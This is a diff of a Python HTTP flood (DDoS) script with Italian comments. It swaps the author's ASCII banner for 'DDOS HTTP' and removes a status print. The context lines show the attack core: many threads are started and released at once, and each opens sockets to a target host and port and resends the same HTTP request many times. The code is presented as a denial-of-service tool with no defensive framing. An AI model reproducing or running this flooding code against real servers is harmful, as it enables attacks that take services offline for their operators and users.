@@ -11,19 +11,7 @@ import sys
 
 print('''
 
-
-  hh   hh  iii  bbbbbbb  eeeeeee  rrrrrrrr  nn     nnn  eeeeeee  ttttttttt
-  hh   hh  iii  bb   bb  eeeeeee  rr    rr  nnn    nnn  eeeeeee     ttt
-  hh   hh  iii  bb   bb  ee       rr    rr  nnnn   nnn  ee          ttt
-  hh   hh  iii  bbbbbbb  ee       rrrrrrrr  nnnnnnnnnn  ee          ttt
-  hhhhhhh  iii  bb       eeeeeee  rrrr      nnnnnnnnnn  eeeeeee     ttt
-  hh   hh  iii  bbbbbbb  ee       rr rr     nnnnnnnnnn  ee          ttt
-  hh   hh  iii  bb   bb  ee       rr  rr    nn  nnnnnn  ee          ttt
-  hh   hh  iii  bb   bb  eeeeeee  rr   rr   nnn  nnnnn  eeeeeee     ttt
-  hh   hh  iii  bbbbbbb  eeeeeee  rr    rr  nnnn  nnnn  eeeeeee     ttt
-
-
-							C0d3d by All3xJ
+DDOS HTTP
 	''') # la grafica ci sta
 
 
@@ -645,6 +633,7 @@ def loop():
 		for x in range(threads):
 			RequestDefaultHTTP(x+1).start() # starta la classe apposita
 			print ("Thread " + str(x) + " ready!")
+			
 		go.set() # questo fa avviare i threads appena sono tutti pronti
 
 
@@ -756,7 +745,7 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
-				print ("Request sent! @", self.counter) # print req + counter
+				 # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
